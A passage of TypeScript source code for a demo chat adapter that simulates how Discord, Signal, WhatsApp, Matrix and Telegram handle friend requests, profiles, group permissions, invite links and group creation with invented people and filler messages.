      return { what: 'person', name: handle, ...(this.network === 'matrix' ? { nativeId: handle } : {}), actions: ['message'] };
    }
    const friend = known.contact || this.state.friends.includes(known.nativeId);
    const actions: P.AddAction[] = ['message', ...(this.network === 'discord' && !friend ? (['friend'] as const) : []), ...(this.network === 'telegram' && !friend ? (['contact'] as const) : [])];
    return {
      what: 'person',
      name: known.displayName ?? handle,
      nativeId: known.nativeId,
      relationship: friend ? (this.network === 'discord' ? 'friend' : 'contact') : 'stranger',
      actions,
      ...(this.network === 'telegram' && !friend ? { notes: ["Adding a contact on Telegram doesn't share your number"] } : {}),
    };
  }

  private addPerson(ref: P.AddRef, action: Exclude<P.AddAction, 'message'>, confirm: boolean): P.AddResult {
    const handle = ref.kind === 'name' ? ref.name : ref.kind === 'person' ? ref.handle : '';
    if (action === 'join' || action === 'ask') throw new Error(`${NETWORK_META_NAME[this.network]} cannot join a person`);
    const known = this.person(handle);
    if (this.network === 'discord' && action === 'friend') {
      // Someone the demo world has never seen shares nothing with you: Discord wants a confirm first.
      if (!known && !confirm) return { confirm: CONFIRM_LINE };
      const who = known ?? { nativeId: snow(`u-${handle}`), handle, displayName: handle };
      if (!known) this.emit({ t: 'identity', identity: who });
      if (!this.state.requested?.includes(who.nativeId)) {
        this.state.requested = [...(this.state.requested ?? []), who.nativeId];
        this.save();
      }
      this.setLink(who.nativeId, 'requested');
      return { identity: who.nativeId, relationship: 'requested', pending: true };
    }
    if (this.network === 'telegram' && action === 'contact' && known) {
      this.state.friends.push(known.nativeId);
      this.save();
      this.emit({ t: 'identity', identity: { ...known, contact: true } });
      this.setLink(known.nativeId, 'contact');
      return { identity: known.nativeId, relationship: 'contact' };
    }
    throw new Error(`${NETWORK_META_NAME[this.network]} cannot ${action} here`);
  }

  private answer(request: string, answer: P.RequestAnswer, now: number, confirm: boolean): P.AddResult {
    const r = this.requests(now).find((x) => x.nativeId === request && !this.state.answered.includes(x.nativeId));
    if (!r) throw new Error('That request is not waiting any more');
    if (!r.answers.includes(answer)) throw new Error(`This request cannot be answered with ${answer}`);
    // A request Discord flagged is accepted only once the owner confirms; nothing is done before.
    if (r.warning && answer === 'accept' && !confirm) return { confirm: CONFIRM_LINE };
    this.state.answered.push(request);
    this.save();
    this.emit({ t: 'requestGone', nativeId: request });
    if (r.kind === 'friend') {
      const who = Object.values(D).find((i) => i.nativeId === r.from)!;
      if (answer === 'accept') this.state.friends.push(who.nativeId);
      if (answer === 'block') this.state.blocked = [...(this.state.blocked ?? []), who.nativeId];
      this.save();
      this.setLink(who.nativeId, answer === 'accept' ? 'friend' : answer === 'block' ? 'blocked' : 'stranger');
      if (answer === 'accept') this.emit({ t: 'identity', identity: { ...who, contact: true } });
      return { identity: r.from, relationship: answer === 'accept' ? 'friend' : answer === 'block' ? 'blocked' : 'stranger' };
    }
    if (r.kind === 'invite' && answer === 'accept') {
      const nativeId = r.target!.nativeId;
      this.emit({ t: 'conversation', conversation: { nativeId, shape: 'channel', name: r.target!.name, topic: 'Planning the winter hackathon', lastMessageAt: now } });
      this.emit({ t: 'message', live: false, message: { nativeId: `${nativeId}~add-0`, conversation: nativeId, author: M.jules.nativeId, ts: now - 60_000, body: 'welcome! we are picking a date this week' } });
      return { conversation: nativeId };
    }
    if (r.kind === 'message') {
      const conv = r.target!.nativeId;
      if (answer !== 'accept') this.emit({ t: 'leave', kind: 'conversation', nativeId: conv });
      return answer === 'accept' ? { conversation: conv, relationship: 'stranger' } : { relationship: answer === 'block' ? 'blocked' : 'stranger' };
    }
    return {};
  }
}

/**
 * What the networks hold that the demo never sent: older messages before each conversation's first, for history pages,
 * index jobs and network search (jobs.ts, netsearch.ts), and a big server's member list to walk. The same every time.
 */
const ARCHIVE_SIZE = 240;
const ARCHIVE_LINES = [
  'has anyone tried the new release notes yet',
  'the borrow checker is complaining about a lifetime again',
  'deploying the staging build tonight, shout if something breaks',
  'climbing at the gym on thursday, who is in',
  'I pushed a fix for the dither pattern on dark backgrounds',
  'is the meeting still on for friday',
  'reminder: the conference talk proposals close next week',
  'the speedrun route skips the second boss now',
  'async traits finally landed, time to delete the workarounds',
  'can someone review my pull request when they get a chance',
  'the matrix bridge dropped messages overnight',
  'new benchmark numbers: twice as fast on the large inputs',
  'who wants to pair on the parser rewrite',
  'lunch at the ramen place again?',
  'the cache invalidation bug is back',
  'posting the meeting notes in a minute',
];
const ARCHIVE_GAP_MIN = 3 * 60;
const MEMBER_FIRST = ['ada', 'alex', 'bea', 'cam', 'dani', 'eli', 'fern', 'gus', 'hana', 'ivo', 'juno', 'kai', 'lena', 'milo', 'nia', 'oren', 'pia', 'quin', 'rosa', 'sol', 'tess', 'umi', 'vik', 'wren', 'xan', 'yuki', 'zed'];
const MEMBER_LAST = ['', '_dev', '42', 'x', '.art', 'bot', '_rs', '99', 'kun', 'z'];

/** A conversation as its network has it: the archive, then what the demo sends, oldest first. */
function networkMessages(c: DemoConv, network: P.Network, ago: (min: number) => number, self: P.IdentityFact): P.MessageFact[] {
  const pool = Object.values(POOLS[network] ?? D).filter((i) => i !== self);
  const first = c.msgs.length ? Math.max(...c.msgs.map((m) => m[0])) : 60 * 24;
  // As the first sync sent them: a system line, a sticker or a file stays one when the network sends it again.
  const seeded = c.msgs.map(([min, author, body, o = {}], i) => ({
    nativeId: `${c.fact.nativeId}~${i}`,
    conversation: c.fact.nativeId,
    author: author.nativeId,
    ts: ago(min),
    body,
    kind: o.kind ?? (o.att?.length ? 'media' : 'text'),
    ...(o.att ? { attachments: o.att } : {}),
  }));
  const k = parseInt(h('a' + c.fact.nativeId).toString('hex').slice(0, 6), 16);
  const archive = Array.from({ length: ARCHIVE_SIZE }, (_, i) => {
    const back = ARCHIVE_SIZE - i;
    return {
      nativeId: `${c.fact.nativeId}~a${pos(i)}`,
      conversation: c.fact.nativeId,
      author: pool[(k + i * 7) % pool.length].nativeId,
      ts: ago(first + back * ARCHIVE_GAP_MIN),
      body: `${ARCHIVE_LINES[(k + i * 5) % ARCHIVE_LINES.length]} (${c.fact.name ?? 'here'} #${i + 1})`,
    };
  });
  return [...archive, ...seeded].sort((a, b) => a.ts - b.ts);
}

/** A big server's members beyond the few the client saw: 270 made-up people. */
const WALKABLE: P.IdentityFact[] = MEMBER_FIRST.flatMap((f, i) => MEMBER_LAST.map((l, j) => ({ nativeId: snow(`member-${i}-${j}`), displayName: `${f}${l}`, handle: `${f}${l}` })));

class DemoAdapter implements InprocAdapter {
  private emit!: (ev: P.AdapterEvent) => void;
  private timers = new Set<Timer>();
  private typingLog: { conversation: string; stop: boolean; at: number }[] = [];
  /** What the hub told this account to mark read (action readLog): a message request's must stay empty (docs/add.md). */
  private readLog: { conversation: string; upTo: string; at: number }[] = [];
  private self: P.IdentityFact;
  private adds!: DemoAdd;
  /** The account's own self (demoself.ts): Discord's demo accounts only. */
  private selfDemo: DemoSelf | null = null;
  /** Discord servers beyond their channels: events, leaving, gates, nicknames, invite links (demoservers.ts). */
  private servers: DemoServers | null = null;
  /** Discord threads, forums and group DMs beyond messages (demothreads.ts). */
  private threadsDemo: DemoThreads | null = null;
  /** Capabilities a verify script took away (action 'capabilities'), to see the page without them. */
  private without = new Set<P.Capability>();
  private network: P.Network;
  private ago: (min: number) => number = (min) => Date.now() - min * 60_000;

  constructor(
    private key: AccKey,
    private acc: AccountRow,
    private dir: string,
  ) {
    this.network = acc.network;
    this.self = key === 'dmain' ? D.zyan : key === 'dalt' ? D.zyn : key === 'sig' ? S.self : key === 'wa' ? W.self : key === 'tg' ? TG.self : M.self;
  }

  /** The demo plays a Nitro account on Discord, and a room image pack on Matrix, so every path can be tried. */
  private reactionContext(): P.ReactionContext {
    if (this.network === 'discord') {
      return {
        canReact: true,
        custom: [
          { id: 'demo-here', name: 'This server', emoji: DEMO_EMOJI.slice(0, 4) },
          { id: 'demo-other', name: 'Rust Programming Language', emoji: DEMO_EMOJI.slice(4) },
        ],
        super: { available: true },
      };
    }
    if (this.network === 'matrix') return { canReact: true, custom: [{ id: 'demo-pack', name: 'Housemates pack', emoji: DEMO_EMOJI.slice(0, 3).map((e) => ({ ...e, key: `mxc://demo/${e.name}` })) }] };
    return { canReact: true, custom: [] };
  }

  private findConv(nativeId: string): DemoConv | undefined {
    return this.made.get(nativeId) ?? CONVS.find((c) => c.fact.nativeId === nativeId && c.acc.includes(this.key));
  }

  private findSpace(nativeId: string): DemoSpace | undefined {
    return SPACES.find((x) => x.fact.nativeId === nativeId && x.acc.includes(this.key));
  }

  /** The Discord server a channel is in, through its category. */
  private guildOf(c: DemoConv): string | null {
    const parent = c.fact.parentConversation ? this.findConv(c.fact.parentConversation) : null;
    const sec = (parent ?? c).fact.spaces?.[0]?.nativeId;
    const space = sec ? SPACES.find((x) => x.fact.nativeId === sec) : null;
    return space?.fact.kind === 'section' ? (space.fact.parents?.[0]?.nativeId ?? null) : (space?.fact.nativeId ?? null);
  }

  private place(target: P.AboutTarget): { place: DemoPlace; conv?: DemoConv; space?: DemoSpace } {
    const conv = target.kind === 'conversation' ? this.findConv(target.nativeId) : undefined;
    const space = target.kind === 'space' ? this.findSpace(target.nativeId) : undefined;
    if (!conv && !space) throw new Error(`this demo account is not in that ${target.kind}`);
    let place = demoPlaces.get(target.nativeId);
    if (!place) {
      const f = conv?.fact ?? space!.fact;
      const base: Partial<P.AboutValues> = { name: f.name ?? '', topic: f.topic ?? '' };
      if (this.network === 'signal' || this.network === 'whatsapp') Object.assign(base, { disappearing: 0, announceOnly: conv?.fact.variant === 'announcement', editInfo: 'admins', addMembers: 'admins', joinApproval: false, encrypted: true });
      if (this.network === 'matrix') Object.assign(base, { announceOnly: conv?.fact.variant === 'announcement', joinRule: space ? 'open' : conv?.fact.shape === 'channel' ? 'space' : 'invite', history: 'shared', encrypted: !!conv?.fact.encrypted });
      if (this.network === 'discord' && conv) Object.assign(base, { slowMode: 0, nsfw: false, announceOnly: conv.fact.variant === 'announcement' });
      const invite =
        this.network === 'signal' && target.nativeId === sgroup('climb', '', []).nativeId
          ? 'https://signal.group/#CjQKIDemoClimbingCrewLink'
          : this.network === 'discord' && space?.fact.kind === 'community'
            ? `https://discord.gg/demo${target.nativeId.slice(-6)}`
            : null;
      place = { values: { ...base, ...DEMO_VALUES[target.nativeId] }, pinned: [...(DEMO_PINS[target.nativeId] ?? [])], invite };
      demoPlaces.set(target.nativeId, place);
    }
    return { place, conv, space };
  }

  /** The same answers real adapters give, by each network's own rules. */
  /** What each network's profile shows for someone (docs/profile.md), as its adapter would say it. */
  /** What Signal's adapter adds to a profile: your editable fields and username, or their safety number. */
  private signalExtras(p: P.PersonAbout, who: string): P.PersonAbout {
    if (this.network !== 'signal') return p;
    if (who === this.self.nativeId) {
      const u = DEMO_USERNAME.get(who);
      return { ...p, editable: ['bio', 'name', 'emoji', 'avatar', 'username'], ...(u ? { username: u } : {}) };
    }
    const digits = demoSafety(who);
    return { ...p, safety: { digits, scannable: btoa(digits.slice(0, 32)), trust: DEMO_VERIFIED.has(who) ? 'verified' : 'unverified' } };
  }

  private profile(who: string): P.PersonAbout {
    const pool = POOLS[this.network] ?? M;
    const key = (Object.entries(pool) as [string, P.IdentityFact][]).find(([, i]) => i.nativeId === who)?.[0];
    const me = who === this.self.nativeId;
    const contacts = Object.values(pool).filter((i) => i.contact && i !== this.self);
    if (this.network === 'discord') {
      const mine = SPACES.filter((x) => x.acc.includes(this.key) && x.fact.kind === 'community').map((x) => x.fact.nativeId);
      const own = OWN_BIO.get(`discord:${who}`);
      const p = { ...DISCORD_PROFILES[key ?? ''], ...(own !== undefined ? { bio: own } : {}) };
      for (const f of contacts) this.emit({ t: 'identity', identity: f });
      return {
        ...(p.bio ? { bio: p.bio } : {}),
        ...(p.pronouns ? { pronouns: p.pronouns } : {}),
        ...(p.status ? { status: p.status } : {}),
        accent: p.accent ?? '#5865F2',
        createdAt: Date.UTC(2017 + (who.length % 6), (who.charCodeAt(3) ?? 0) % 12, 9),
        relationship: me ? undefined : (this.adds.relationship(who) ?? (pool[key as keyof typeof pool]?.contact ? 'friend' : 'stranger')),
        ...(me ? { friends: contacts.map((i) => i.nativeId) } : {
          mutualSpaces: (p.servers ?? []).map((k) => ({ k, id: g[k] })).filter((x) => mine.includes(x.id)).map((x) => ({ id: x.id, ...(p.nick?.[x.k] ? { nick: p.nick[x.k] } : {}), roles: p.roles?.[x.k] ?? [] })),
          mutualFriends: contacts.filter((i) => i.nativeId !== who && (p.friends ?? []).includes(Object.entries(D).find(([, x]) => x === i)?.[0] ?? '')).map((i) => i.nativeId),
        }),
        ...(p.links ? { links: p.links } : {}),
      };
    }
    const me_ = pool[key as keyof typeof pool] as P.IdentityFact | undefined;
    if (this.network === 'signal') {
      const own = OWN_BIO.get(`signal:${who}`);
      const about = own !== undefined ? (own ? { text: own, emoji: SIGNAL_ABOUT[key ?? '']?.emoji ?? '' } : undefined) : SIGNAL_ABOUT[key ?? ''];
      return {
        ...(about ? { bio: about.text, status: { emoji: about.emoji } } : {}),
        relationship: me ? undefined : me_?.contact ? 'contact' : 'stranger',
        ...(me_?.handle ? { links: [{ label: 'Phone', value: me_.handle, url: `tel:${me_.handle.replace(/\s/g, '')}` }] } : {}),
        ...(me ? { friends: contacts.map((i) => i.nativeId) } : {}),
      };
    }
    if (this.network === 'whatsapp') {
      return {
        bio: OWN_BIO.get(`whatsapp:${who}`) ?? WHATSAPP_ABOUT[key ?? ''] ?? 'Hey there! I am using WhatsApp.',
        relationship: me ? undefined : me_?.contact ? 'contact' : 'stranger',
        ...(me_?.handle ? { links: [{ label: 'Phone', value: me_.handle, url: `https://wa.me/${me_.handle.replace(/\D/g, '')}` }] } : {}),
        ...(key === 'hoa' ? { facts: [{ label: 'Business', value: 'Maple Street Garden Swap' }] } : {}),
        ...(me ? { friends: contacts.map((i) => i.nativeId) } : {}),
      };
    }
    // Telegram says whether they are in your contacts.
    const tg = this.network === 'telegram' && !me ? { relationship: this.adds.relationship(who) ?? (me_?.contact ? 'contact' : 'stranger') } : {};
    return { ...(key === 'kai' ? { pronouns: 'they/them', facts: [{ label: 'Local time', value: 'Europe/Berlin' }] } : {}), ...tg };
  }

  /** Discord's servers beyond their channels (demoservers.ts): events now, and what their About adds. */
  private startServers(epoch: number) {
    const guilds = () => SPACES.filter((x) => x.acc.includes(this.key) && x.fact.kind === 'community').map((x) => x.fact.nativeId);
    this.servers = new DemoServers(
      {
        key: this.key,
        selfId: this.self.nativeId,
        emit: (ev) => this.emit(ev),
        guilds,
        admin: (guild) => ADMIN_IN[this.key].includes(guild),
        childrenOf: (guild) => {
          const spaces = SPACES.filter((x) => x.acc.includes(this.key) && x.fact.parents?.some((p) => p.nativeId === guild)).map((x) => x.fact.nativeId);
          const under = new Set([guild, ...spaces]);
          return { spaces, convs: CONVS.filter((c) => c.acc.includes(this.key) && c.fact.spaces?.some((sp) => under.has(sp.nativeId))).map((c) => c.fact.nativeId) };
        },
      },
      { rust: g.rust, dither: g.dither, hk: g.hk, pixel: gp.pixel, rustVoice: ch('rust-voice-general'), ditherVoice: ch('dither-hangout'), lev: D.lev.nativeId },
      epoch,
    );
    this.servers.announce();
  }

  private threadAbout(target: P.AboutTarget, about: P.About): P.About {
    return this.threadsDemo ? this.threadsDemo.about(target, about) : about;
  }

  private serverAbout(target: P.AboutTarget, about: P.About): P.About {
    return this.servers ? this.servers.about(target, about, this.findSpace(target.nativeId)?.fact.kind === 'community') : about;
  }

  private about(target: P.AboutTarget): P.About {
    const { place, conv, space } = this.place(target);
    const v = place.values;
    const net = this.network;
    const shape = conv?.fact.shape;
    const where = conv && net === 'discord' && shape !== 'direct' && shape !== 'group' ? this.guildOf(conv) : null;
    const admin = ADMIN_IN[this.key].includes(target.nativeId) || (!!where && ADMIN_IN[this.key].includes(where));
    const level = net === 'matrix' ? (MX_LEVEL[target.nativeId] ?? (admin || shape === 'direct' || shape === 'self' ? 100 : 0)) : admin ? 100 : 0;
    const fields: P.AboutFields = {};
    const set = <K extends P.AboutKey>(k: K, canEdit: boolean, reason?: string) => {
      if (k in v || k === 'avatar') (fields as Record<string, P.AboutSetting>)[k] = { value: (v[k] ?? null) as never, canEdit, ...(reason && !canEdit ? { reason } : {}) };
    };
    const rules: P.AboutRule[] = [];
    const members: P.AboutMember[] = [];
    const pool = Object.values(POOLS[net] ?? M);
    const ids = new Set<string>([...(conv?.fact.participants ?? []), ...(this.addedTo.get(target.nativeId) ?? [])]);
    if (!ids.size) {
      ids.add(this.self.nativeId);
      for (const c of conv ? [conv] : CONVS.filter((c) => c.acc.includes(this.key) && c.fact.spaces?.some((sp) => sp.nativeId === target.nativeId || SPACES.some((x) => x.fact.nativeId === sp.nativeId && x.fact.parents?.some((pp) => pp.nativeId === target.nativeId)))))
        for (const m of c.msgs) ids.add(m[1].nativeId);
    }
    const pic = 'Changing the picture is not supported yet.';
    let noun = 'Group';
    let adding: P.AboutAdding | undefined;
    if (net === 'discord') {
      const guild = space?.fact.kind === 'community' ? space.fact.nativeId : where;
      const roles = guild ? DISCORD_ROLES[guild] ?? [] : [];
      for (const id of ids) {
        const staff = id === this.self.nativeId ? (admin ? 'role-maint' : null) : DISCORD_STAFF[id];
        const role = roles.find((r) => r.id === snow(staff ?? '')) ?? roles.find((r) => r.rank === 0);
        members.push({ id, ...(role ? { role: role.name, rank: role.rank } : {}), ...(role?.color ? { color: role.color } : {}) });
      }
      if (space?.fact.kind === 'section') {
        noun = 'Category';
        set('name', admin, 'You need the Manage Channels permission.');
      } else if (space) {
        noun = 'Server';
        set('name', admin, 'You need the Manage Server permission.');
        set('topic', false, 'Only Community servers have a description, set in Discord.');
        set('avatar', false, pic);
      } else if (shape === 'direct') {
        noun = 'Direct message';
      } else if (shape === 'group') {
        set('name', true);
        set('avatar', false, pic);
        rules.push({ what: 'Rename, change the icon, add people', who: 'Everyone in the group', you: true }, { what: 'Remove people', who: 'The group owner', you: false });
        // As the real adapter says it: a group DM holds 10 people, and only friends can be added.
        adding = ids.size < 10 ? { can: true, reason: 'Only your friends, up to 10 people in all.', who: 'friends', mode: 'add', room: 10 - ids.size } : { can: false, reason: 'A Discord group holds at most 10 people.', who: 'friends', mode: 'add', room: 0 };
      } else {
        noun = shape === 'thread' ? 'Thread' : 'Channel';
        const need = 'You need the Manage Channels permission.';
        set('name', admin, need);
        if (shape !== 'thread') set('topic', admin, need);
        set('slowMode', admin, need);
        if (shape !== 'thread') set('nsfw', admin, need);
        set('announceOnly', false, admin ? "Change who can send in the channel's permissions, in Discord." : need);
      }
      if (shape !== 'direct' && shape !== 'group') {
        rules.push(
          { what: 'Change the name, topic and slow mode', who: 'Manage Channels', you: admin },
          { what: 'Change the server', who: 'Manage Server', you: admin },
          { what: 'Pin messages', who: 'Pin Messages', you: admin },
          { what: 'Create invites', who: 'Create Instant Invite', you: true },
        );
      }
      return {
        noun,
        fields,
        members: { list: members, total: space || where ? Math.max(members.length, 1200) : members.length, complete: !(space || where) },
        ...(roles.length ? { roles } : {}),
        rules,
        ...(adding ? { adding } : {}),
        you: { role: admin ? 'Maintainer' : 'Member', rank: admin ? 100 : 0 },
        ...(space?.fact.kind === 'community' ? { invite: { link: place.invite, canCreate: true, canRevoke: admin && !!place.invite, ...(admin ? {} : { reason: 'Only people with Manage Server can turn invites off.' }) } } : {}),
        ...(conv && shape !== 'thread' ? { pinned: { messages: place.pinned, canEdit: admin || shape === 'direct' || shape === 'group', reason: 'You need the Pin Messages permission.' } } : {}),
        ...(space?.fact.kind === 'community' ? { facts: [{ label: 'Verification level', value: 'Low: a verified email' }] } : {}),
      };
    }
    if (net === 'signal' || net === 'whatsapp') {
      const wa = net === 'whatsapp';
      noun = space ? 'Community' : shape === 'direct' ? 'Chat' : shape === 'self' ? 'Note to Self' : 'Group';
      for (const id of ids) {
        const isAdmin = id === this.self.nativeId ? admin : wa ? id === W.ines.nativeId || id === W.hoa.nativeId : id === S.priya.nativeId || id === S.mom.nativeId || id === S.quinn.nativeId;
        const owner = wa && isAdmin && id !== this.self.nativeId;
        members.push({ id, role: owner ? 'Group owner' : isAdmin ? 'Admin' : 'Member', rank: owner ? 110 : isAdmin ? 100 : 0 });
      }
      if (shape === 'direct' || shape === 'self') {
        set('disappearing', true);
        set('encrypted', false, `Always on in ${NETWORK_META_NAME[net]}.`);
        return { noun, fields, members: { list: members, complete: true }, rules: [{ what: 'Change disappearing messages', who: shape === 'self' ? 'You' : 'Either of you', you: true }] };
      }
      const info = admin || v.editInfo === 'everyone';
      const onlyAdmins = 'Only admins can change this.';
      const lockedInfo = wa ? 'Only admins can edit this group’s info.' : 'Only admins can edit this group’s details.';
      set('name', info, lockedInfo);
      set('topic', info, lockedInfo);
      set('avatar', false, info ? pic : lockedInfo);
      set('disappearing', info, lockedInfo);
      set('announceOnly', admin, onlyAdmins);
      set('editInfo', admin, onlyAdmins);
      set('addMembers', admin, onlyAdmins);
      set('joinApproval', admin, onlyAdmins);
      set('encrypted', false, `Always on in ${NETWORK_META_NAME[net]}.`);
      if (!wa && fields.joinApproval) fields.joinApproval = { value: null, canEdit: false, reason: 'Signal does not say whether approval is on.' };
      const who = (w: P.Who | undefined) => (w === 'everyone' ? 'All members' : 'Only admins');
      rules.push(
        { what: 'Edit name, description and disappearing messages', who: who(v.editInfo), you: info },
        { what: 'Add members', who: who(v.addMembers), you: admin || v.addMembers === 'everyone' },
        { what: 'Send messages', who: v.announceOnly ? 'Only admins' : 'All members', you: admin || !v.announceOnly },
        { what: 'Change these settings and the invite link', who: 'Only admins', you: admin },
      );
      return {
        noun,
        fields,
        members: { list: members, complete: true },
        roles: [
          ...(wa ? [{ id: 'superadmin', name: 'Group owner', rank: 110 }] : []),
          { id: 'admin', name: 'Admin', rank: 100, count: members.filter((m) => (m.rank ?? 0) >= 100).length },
          { id: 'member', name: 'Member', rank: 0, count: members.filter((m) => !m.rank).length },
        ],
        rules,
        ...(wa ? {} : { adding: { can: admin || v.addMembers === 'everyone', ...(admin || v.addMembers === 'everyone' ? {} : { reason: 'Only admins can add members.' }), who: 'known' as const, mode: 'add' as const } }),
        you: { role: admin ? 'Admin' : 'Member', rank: admin ? 100 : 0 },
        invite: { link: admin ? place.invite : wa ? null : place.invite, canCreate: admin, canRevoke: admin && !!place.invite, ...(admin ? {} : { reason: 'Only admins can change the invite link.' }) },
        ...(wa && conv ? { facts: [{ label: 'Created', value: '2024-03-02' }] } : []),
      };
    }
    // Matrix: power levels.
    noun = space ? 'Space' : 'Room';
    const pl = (n: number) => level >= n;
    const need = (n: number) => `Needs power level ${n}; yours is ${level}.`;
    set('name', pl(50), need(50));
    set('topic', pl(50), need(50));
    set('avatar', false, pl(50) ? pic : need(50));
    if (conv) set('announceOnly', pl(100), need(100));
    set('joinRule', pl(100), need(100));
    if (conv) set('history', pl(100), need(100));
    if (conv) set('encrypted', !v.encrypted && pl(100), v.encrypted ? 'Encryption cannot be turned off once on.' : need(100));
    for (const id of ids) {
      const lvl = id === this.self.nativeId ? level : id === M.kai.nativeId || id === M.lina.nativeId || id === M.jules.nativeId ? 100 : id === M.nixbot.nativeId ? 50 : 0;
      members.push({ id, rank: lvl, role: lvl >= 100 ? 'Admin' : lvl >= 50 ? 'Moderator' : 'Member' });
    }
    const alias = conv?.fact.name ? `#${conv.fact.name.toLowerCase().replace(/[^a-z0-9]+/g, '-')}:${target.nativeId.split(':')[1]}` : null;
    rules.push(
      { what: 'Change name, topic and picture', who: 'Moderators (50)', you: pl(50) },
      { what: 'Change join rules, history and encryption', who: 'Admins (100)', you: pl(100) },
      { what: 'Invite people', who: 'Everyone (0)', you: true },
      { what: 'Remove or ban people', who: 'Moderators (50)', you: pl(50) },
      { what: 'Pin messages', who: 'Moderators (50)', you: pl(50) },
    );
    return {
      noun,
      fields,
      members: { list: members, complete: true },
      roles: [
        { id: '100', name: 'Admin', rank: 100 },
        { id: '50', name: 'Moderator', rank: 50 },
        { id: '0', name: 'Member', rank: 0 },
      ],
      rules,
      ...(net === 'matrix' && conv && shape !== 'direct' && shape !== 'self' ? { adding: { can: true, who: 'known' as const, mode: 'invite' as const } } : {}),
      you: { role: lc(level >= 100 ? 'admin' : level >= 50 ? 'moderator' : 'member'), rank: level },
      invite: { link: `https://matrix.to/#/${encodeURIComponent(alias ?? target.nativeId)}`, canCreate: false, derived: true, reason: 'Matrix links are made from the room’s address, not issued.' },
      ...(conv ? { pinned: { messages: place.pinned, canEdit: pl(50), reason: need(50) } } : {}),
      facts: [{ label: 'Room version', value: '11' }],
    };
  }

  /** Apply a change the hub has checked, and say so the way the network would. */
  private configure(target: P.AboutTarget, change: P.AboutChange): P.About {
    const { place, conv, space } = this.place(target);
    if (change.key === 'invite') place.invite = change.op === 'create' ? `https://${this.network === 'signal' ? 'signal.group/#' : this.network === 'whatsapp' ? 'chat.whatsapp.com/' : 'discord.gg/'}demo${Date.now().toString(36)}` : null;
    else if (change.key === 'pin') {
      place.pinned = place.pinned.filter((m) => m !== change.message);
      if (!change.remove) place.pinned.unshift(change.message);
    } else (place.values as Record<string, unknown>)[change.key] = change.value;
    if (change.key === 'name' || change.key === 'topic') {
      if (conv) {
        conv.fact = { ...conv.fact, [change.key]: change.value };
        this.emit({ t: 'conversation', conversation: conv.fact });
      } else if (space) {
        space.fact = { ...space.fact, [change.key]: change.value };
        this.emit({ t: 'space', space: space.fact });
      }
    }
    if (conv && (this.network === 'signal' || this.network === 'whatsapp') && change.key !== 'pin') {
      const what = change.key === 'invite' ? (change.op === 'create' ? 'reset the group link' : 'turned off the group link') : `changed ${P_ABOUT_LABEL[change.key].toLowerCase()}`;
      this.emit({ t: 'message', live: false, message: { nativeId: `${target.nativeId}~cfg-${Date.now()}`, conversation: target.nativeId, author: this.self.nativeId, ts: Date.now(), kind: 'system', body: `You ${what}.` } });
    }
    return this.about(target);
  }

  /**
   * Add people as each network would: Discord only friends, Signal adds (someone whose profile it lacks, Dad here,
   * comes in as invited), Matrix invites. Their conversation fact goes out again with the new participants.
   */
  private addedTo = new Map<string, Set<string>>();
  private addMembers(target: P.AboutTarget, people: string[]): P.AddMembersResult {
    const { conv } = this.place(target);
    if (!conv || conv.fact.shape !== 'group' && this.network !== 'matrix') throw new Error('People are added to groups only');
    const before = this.about(target).adding;
    if (!before?.can) throw new Error(before?.reason ?? 'You cannot add people here.');
    const added: string[] = [];
    const invited: string[] = [];
    const failed: { id: string; reason: string }[] = [];
    const known = Object.values(POOLS[this.network] ?? {});
    for (const id of people) {
      if (!known.some((i) => i.nativeId === id)) failed.push({ id, reason: `${NETWORK_META_NAME[this.network]} does not know them.` });
      else if (this.network === 'discord' && this.adds.current(id) !== 'friend') failed.push({ id, reason: 'Discord adds only your friends to a group.' });
      else if (this.network === 'matrix' || (this.network === 'signal' && id === S.dad.nativeId)) invited.push(id);
      else added.push(id);
    }
    if (added.length) {
      // This account's own: the demo world's conversations are shared by every demo hub in the process.
      const mine = this.addedTo.get(target.nativeId) ?? new Set<string>();
      for (const id of added) mine.add(id);
      this.addedTo.set(target.nativeId, mine);
      this.emit({ t: 'conversation', conversation: { ...conv.fact, participants: [...new Set([...(conv.fact.participants ?? []), ...mine])] } });
    }
    if (this.network === 'signal' && (added.length || invited.length)) {
      const names = [...added, ...invited].map((id) => known.find((i) => i.nativeId === id)?.displayName ?? id).join(', ');
      this.emit({ t: 'message', live: false, message: { nativeId: `${target.nativeId}~add-${Date.now()}`, conversation: target.nativeId, author: this.self.nativeId, ts: Date.now(), kind: 'system', body: `You added ${names}.` } });
    }
    return { added, ...(invited.length ? { invited } : {}), ...(failed.length ? { failed } : {}), about: this.about(target) };
  }

  /**
   * Make a group as each network would: Discord only with friends (at least 2 of them, or no group), Signal adds
   * (someone whose profile it lacks, Dad here, comes in invited), Matrix invites everyone, Telegram refuses Noor for her
   * privacy settings. The new conversation's fact goes out before the reply; it takes sends, and this account is its admin.
   */
  private made = new Map<string, DemoConv>();
  private createGroup(name: string | undefined, people: string[]): P.CreateGroupResult {
    const net = NETWORK_META_NAME[this.network];
    const added: string[] = [];
    const invited: string[] = [];
    const failed: { id: string; reason: string }[] = [];
    const known = Object.values(POOLS[this.network] ?? {});
    for (const id of people) {
      if (!known.some((i) => i.nativeId === id)) failed.push({ id, reason: `${net} does not know them.` });
      else if (this.network === 'discord' && this.adds.current(id) !== 'friend') failed.push({ id, reason: 'Discord adds only your friends to a group.' });
      else if (this.network === 'telegram' && id === TG_PRIVATE) failed.push({ id, reason: "Their privacy settings don't let you add them to groups." });
      else if (this.network === 'matrix' || (this.network === 'signal' && id === S.dad.nativeId)) invited.push(id);
      else added.push(id);
    }
    if (this.network === 'discord' && added.length < 2) throw new Error(failed.length ? `${failed[0].reason} A group DM needs at least 2 of your friends.` : 'A group DM needs at least 2 of your friends.');
    const k = `made-${this.key}-${Date.now()}-${this.made.size}`;
    const nativeId =
      this.network === 'signal' ? sgroup(k, '', []).nativeId : this.network === 'matrix' ? room(k, 'matrix.org') : this.network === 'telegram' ? `chat:${h('tc' + k).readUInt32BE(0)}` : snow(k);
    const fact: P.ConversationFact = {
      nativeId,
      shape: 'group',
      ...(name ? { name } : {}),
      participants: [this.self.nativeId, ...added],
      ...(this.network === 'signal' || this.network === 'matrix' ? { encrypted: true } : {}),
    };
    this.made.set(nativeId, { acc: [this.key], fact, msgs: [] });
    ADMIN_IN[this.key].push(nativeId);
    this.emit({ t: 'conversation', conversation: fact });
    if (this.network === 'signal' || this.network === 'telegram')
      this.emit({ t: 'message', live: false, message: { nativeId: `${nativeId}~made`, conversation: nativeId, author: this.self.nativeId, ts: Date.now(), kind: 'system', body: `You created the group${name ? ` "${name}"` : ''}.` } });
